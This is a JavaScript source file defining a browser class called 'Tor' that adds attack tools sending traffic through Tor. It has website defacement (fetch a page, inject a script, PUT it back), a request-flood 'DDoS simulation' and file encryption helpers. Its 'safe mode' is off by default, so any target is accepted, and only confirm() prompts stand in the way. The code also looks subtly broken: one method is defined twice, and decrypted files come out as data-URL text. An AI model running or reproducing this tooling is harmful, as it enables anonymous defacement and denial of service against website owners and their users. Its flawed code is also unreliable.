class Tor {
    constructor() {
        // Existing code...

        this.isSafeMode = false;
    }

    // Add a safe mode check
    isTargetSafe(url) {
        if (this.isSafeMode) {
            const safeTargets = ['localhost', '127.0.0.1'];
            const targetHostname = new URL(url).hostname;
            return safeTargets.includes(targetHostname);
        }
        return true;
    }

    // New defacement tool methods
    async backupWebsite(url) {
        if (!this.isTargetSafe(url)) {
            this.log('Target is not safe. Operation aborted.', 'warn');
            return { success: false, message: 'Target is not safe.' };
        }

        try {
            const response = await this.fetchWithTor(url, { method: 'GET' });
            if (!response.ok) {
                throw new Error(`Backup failed with status: ${response.status}`);
            }
            const content = await response.text();
            const backupKey = `backup_${Date.now()}`;
            localStorage.setItem(backupKey, content);
            return { success: true, backupKey: backupKey, message: 'Website backed up successfully.' };
        } catch (error) {
            this.log(`Backup error: ${error}`, 'error');
            return { success: false, message: `Backup failed: ${error}` };
        }
    }

    async restoreWebsite(url, backupKey) {
        if (!this.isTargetSafe(url)) {
            this.log('Target is not safe. Operation aborted.', 'warn');
            return { success: false, message: 'Target is not safe.' };
        }

        try {
            const backupContent = localStorage.getItem(backupKey);
            if (!backupContent) {
                throw new Error('Backup not found.');
            }

            const options = {
                method: 'PUT',
                headers: {
                    'Content-Type': 'text/html',
                    'User-Agent': this.userAgent,
                    ...this.customHeaders
                },
                body: backupContent,
                redirect: 'follow'
            };

            const response = await this.fetchWithTor(url, options);
            if (!response.ok) {
                throw new Error(`Restore failed with status: ${response.status}`);
            }

            return { success: true, message: 'Website restored successfully.' };
        } catch (error) {
            this.log(`Restore error: ${error}`, 'error');
            return { success: false, message: `Restore failed: ${error}` };
        }
    }

    async previewDefacement(url, defaceScript) {
      if (!this.isTargetSafe(url)) {
          this.log('Target is not safe. Operation aborted.', 'warn');
          return { success: false, message: 'Target is not safe.' };
      }
      try {
          const response = await this.fetchWithTor(url, { method: 'GET' });
          if (!response.ok) {
              throw new Error(`Preview failed with status: ${response.status}`);
          }

          let targetContent = await response.text();

          const scriptTag = `<script>${defaceScript}</script>`;
          const injectionPoint = targetContent.indexOf('</body>');

          if (injectionPoint !== -1) {
              targetContent = targetContent.slice(0, injectionPoint) + scriptTag + targetContent.slice(injectionPoint);
          } else {
              targetContent += scriptTag;
          }

          return { success: true, previewContent: targetContent };
      } catch (error) {
          this.log(`Preview error: ${error}`, 'error');
          return { success: false, message: `Preview failed: ${error}` };
      }
    }

    async defaceWebsite(url, defaceScript) {
        if (!this.isTargetSafe(url)) {
            this.log('Target is not safe. Operation aborted.', 'warn');
            return { success: false, message: 'Target is not safe.' };
        }
        
        // Add consent verification
        if (!confirm('You are about to deface a website. Do you have explicit permission?')) {
            this.log('Deface operation cancelled due to lack of consent.', 'warn');
            return { success: false, message: 'Operation cancelled: Permission not granted.' };
        }

        try {
            const response = await this.fetchWithTor(url, { method: 'GET' });
            if (!response.ok) {
                throw new Error(`Failed to fetch the website. Status: ${response.status}`);
            }

            let targetContent = await response.text();

            const scriptTag = `<script>${defaceScript}</script>`;
            const injectionPoint = targetContent.indexOf('</body>');

            if (injectionPoint !== -1) {
                targetContent = targetContent.slice(0, injectionPoint) + scriptTag + targetContent.slice(injectionPoint);
            } else {
                targetContent += scriptTag;
            }

            const putOptions = {
                method: 'PUT',
                headers: {
                    'Content-Type': 'text/html',
                    'User-Agent': this.userAgent,
                    ...this.customHeaders
                },
                body: targetContent,
                redirect: 'follow'
            };

            const putResponse = await this.fetchWithTor(url, putOptions);

            if (putResponse.ok) {
                const successMessage = 'Website defaced successfully!';
                this.log(successMessage, 'success');
                return { success: true, message: successMessage };
            } else {
                const errorMessage = `Failed to deface website. Status: ${putResponse.status}`;
                this.log(errorMessage, 'error');
                return { success: false, message: errorMessage };
            }
        } catch (error) {
            const errorMessage = `Deface operation failed: ${error}`;
            this.log(errorMessage, 'error');
            return { success: false, message: errorMessage };
        }
    }

    setSafeMode(safeMode) {
        this.isSafeMode = safeMode;
        this.log(`Safe mode set to: ${safeMode}`, 'info');
    }

    // New DDoS simulation methods
    async simulateDDoS(url, duration = 10, rate = 100) {
        if (!this.isTargetSafe(url)) {
            this.log('Target is not safe. Operation aborted.', 'warn');
            return { success: false, message: 'Target is not safe.' };
        }

        if (!confirm('You are about to simulate a DDoS attack. Do you have explicit permission?')) {
            this.log('DDoS simulation cancelled due to lack of consent.', 'warn');
            return { success: false, message: 'Operation cancelled: Permission not granted.' };
        }

        const startTime = Date.now();
        const endTime = startTime + (duration * 1000);
        let requestsSent = 0;
        let errors = 0;

        this.log(`Starting DDoS simulation against ${url} for ${duration} seconds.`, 'info');

        while (Date.now() < endTime) {
            for (let i = 0; i < rate; i++) {
                try {
                    const response = await this.fetchWithTor(url, { method: 'GET' });
                    if (!response.ok) {
                        errors++;
                        this.log(`Request failed with status: ${response.status}`, 'warn');
                    }
                    requestsSent++;
                } catch (error) {
                    errors++;
                    this.log(`Request error: ${error}`, 'error');
                }
            }
            await new Promise(resolve => setTimeout(resolve, 1000)); // Rate limiting
        }

        const successMessage = `DDoS simulation finished. Sent ${requestsSent} requests, ${errors} errors.`;
        this.log(successMessage, 'info');
        return { success: true, message: successMessage, requestsSent: requestsSent, errors: errors };
    }

    // New File encryption tool methods
    async encryptFile(file, encryptionKey) {
        if (!confirm('You are about to encrypt a file. Ensure you have a backup and remember the key!')) {
            this.log('File encryption cancelled due to lack of consent.', 'warn');
            return { success: false, message: 'Operation cancelled: Permission not granted.' };
        }

        try {
            const reader = new FileReader();
            reader.onload = async (event) => {
                const fileContent = event.target.result;
                const encryptedContent = CryptoJS.AES.encrypt(fileContent, encryptionKey).toString();

                const encryptedBlob = new Blob([encryptedContent], { type: 'application/octet-stream' });
                const encryptedUrl = URL.createObjectURL(encryptedBlob);

                const downloadLink = document.createElement('a');
                downloadLink.href = encryptedUrl;
                downloadLink.download = `${file.name}.encrypted`;
                document.body.appendChild(downloadLink);
                downloadLink.click();
                document.body.removeChild(downloadLink);

                this.log('File encrypted and downloaded successfully.', 'success');
            };
            reader.onerror = () => {
                this.log('File read error.', 'error');
            };
            reader.readAsDataURL(file);

            return { success: true, message: 'File encryption started.' };
        } catch (error) {
            this.log(`Encryption error: ${error}`, 'error');
            return { success: false, message: `Encryption failed: ${error}` };
        }
    }

    async decryptFile(file, decryptionKey) {
        if (!confirm('You are about to decrypt a file. Ensure you have the correct key!')) {
            this.log('File decryption cancelled due to lack of consent.', 'warn');
            return { success: false, message: 'Operation cancelled: Permission not granted.' };
        }

        try {
            const reader = new FileReader();
            reader.onload = async (event) => {
                const fileContent = event.target.result;
                try {
                    const decryptedContent = CryptoJS.AES.decrypt(fileContent, decryptionKey).toString(CryptoJS.enc.Utf8);

                    if (!decryptedContent) {
                        throw new Error('Decryption failed: Incorrect key or corrupted file.');
                    }

                    const decryptedBlob = new Blob([decryptedContent], { type: 'application/octet-stream' });
                    const decryptedUrl = URL.createObjectURL(decryptedBlob);

                    const downloadLink = document.createElement('a');
                    downloadLink.href = decryptedUrl;
                    downloadLink.download = file.name.replace('.encrypted', '');
                    document.body.appendChild(downloadLink);
                    downloadLink.click();
                    document.body.removeChild(downloadLink);

                    this.log('File decrypted and downloaded successfully.', 'success');
                } catch (error) {
                    this.log(`Decryption error: ${error}`, 'error');
                    return { success: false, message: `Decryption failed: ${error}` };
                }
            };
            reader.onerror = () => {
                this.log('File read error.', 'error');
            };
            reader.readAsText(file);

            return { success: true, message: 'File decryption started.' };
        } catch (error) {
            this.log(`Decryption error: ${error}`, 'error');
            return { success: false, message: `Decryption failed: ${error}` };
        }
    }

    setSafeMode(safeMode) {
        this.isSafeMode = safeMode;
        this.log(`Safe mode set to: ${safeMode}`, 'info');
    }
}

window.Tor = Tor;